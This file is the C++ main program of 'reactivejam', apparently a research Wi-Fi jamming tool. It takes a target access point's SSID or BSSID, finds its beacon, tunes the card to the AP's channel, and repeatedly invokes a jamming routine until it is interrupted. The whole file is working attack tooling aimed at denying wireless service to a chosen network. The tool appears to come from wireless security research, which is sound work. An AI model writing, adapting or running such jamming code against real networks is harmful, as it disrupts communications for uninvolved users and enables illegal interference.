#include <stdarg.h>
#include <getopt.h>
#include <signal.h>
#include <stdexcept>
#include <iostream>

#include "osal_wi.h"
#include "util.h"
#include "ieee80211header.h"
#include "MacAddr.h"

struct options_t {
	char interface[128];

	MacAddr bssid;
	char ssid[128];
	int seconds;

	int config_phy;
} opt;

struct global_t {
	bool exit;
} global;

char usage[] =

"\n"
"  reactivejam - (C) 2013-2014 Mathy Vanhoef\n"
"\n"
"  usage: reactivejam <options>\n"
"\n"
"  Attack options:\n"
"\n"
"      -i interface : Wireless interface to use as the jammer\n"
"      -s ssid      : SSID of the Access Point (AP) to jam\n"
"\n"
"  Optional parameters:\n"
"\n"
//"      -p rateid    : Transmission rate ID for the jamming packet\n"
"      -b bssid     : MAC address of AP to jam\n"
"      -t sec       : Number of seconds to jam\n"
"\n";

void printUsage()
{
	printf("%s", usage);
}

bool parseConsoleArgs(int argc, char *argv[])
{
	int option_index = 0;
	int c;

	static struct option long_options[] = {
		{"help",      0, 0, 'h'}
	};

	if (argc <= 1) {
		printUsage();
		return false;
	}

	// default settings
	memset(&opt, 0, sizeof(opt));
	opt.seconds = 30;

	while ((c = getopt_long(argc, argv, "i:s:b:p:t:h", long_options, &option_index)) != -1)
	{
		switch (c)
		{
		case 'h':
			printUsage();
			// when help is requested, don't do anything other then displaying the message
			return false;

		case 'i':
			strncpy(opt.interface, optarg, sizeof(opt.interface));
			break;

		case 's':
			strncpy(opt.ssid, optarg, sizeof(opt.ssid));
			break;

		case 'b':
			try {
				opt.bssid = MacAddr::parse(optarg);
			} catch (const std::invalid_argument &ex) {
				std::cout << ex.what() << std::endl;
				return false;
			}
			break;

		case 'p':
			printf("Rate selection of the jamming packet is not yet implemented.\n");
			opt.config_phy = atoi(optarg);
			break;

		case 't':
			opt.seconds = atoi(optarg);
			break;

		default:
			printf("Unknown command line option '%c'\n", c);
			return false;
		}
	}

	if (opt.interface[0] == '\x0')
	{
		printf("You must specify an interface to just for jamming (-i).\n");
		printf("\"reactivejam --help\" for help.\n");
		return false;
	}


	if (opt.bssid.empty() && opt.ssid[0] == '\x0')
	{
		printf("You must specify either target a SSID (-s) or a BSSID (-b).\n");
		printf("\"reactivejam --help\" for help.\n");
		return false;
	}


	return true;
}


int find_ap(wi_dev *dev)
{
	uint8_t buf[2048];
	ieee80211header *beaconhdr = (ieee80211header*)buf;
	size_t len;
	int chan;

	len = get_beacon(dev, buf, sizeof(buf), opt.ssid, opt.bssid);
	if (len <= 0) {
		printf("Failed to capture beacon on AP interface\n");
		return -1;
	}

	// Update options based on captured info
	opt.bssid = MacAddr(beaconhdr->addr2);
	beacon_get_ssid(buf, len, opt.ssid, sizeof(opt.ssid));

	// Check channel of network
	chan = beacon_get_chan(buf, len);
	if (chan != osal_wi_getchannel(dev)) {
		printf("Changing channel of %s to %d\n", dev->name, chan);
		osal_wi_setchannel(dev, chan);
	}
	

	return 1;
}


int reactivejam(wi_dev *jam)
{
	if (find_ap(jam) < 0) {
		fprintf(stderr, "Unable to find target AP\n");
		return -1;
	}

	while (!global.exit)
	{
		fprintf(stderr, "=========== JAMMING BSSID =============\n");

		if (osal_wi_jam_beacons(jam, opt.bssid, opt.seconds * 1000) < 0)
		{
			fprintf(stderr, "Something went wrong when issuing the jam command\n");
			exit(1);
		}
	}

	return 1;
}

void handler_sigint(int signum)
{
	global.exit = true;

	fprintf(stderr, "\nStopping jamming...\n");
}

int main(int argc, char *argv[])
{
	wi_dev jam;

	if (!parseConsoleArgs(argc, argv))
		return 2;

	signal(SIGINT, handler_sigint);
	if (osal_wi_open(opt.interface, &jam) < 0) return 1;

	reactivejam(&jam);

	osal_wi_close(&jam);
	return 0;
}


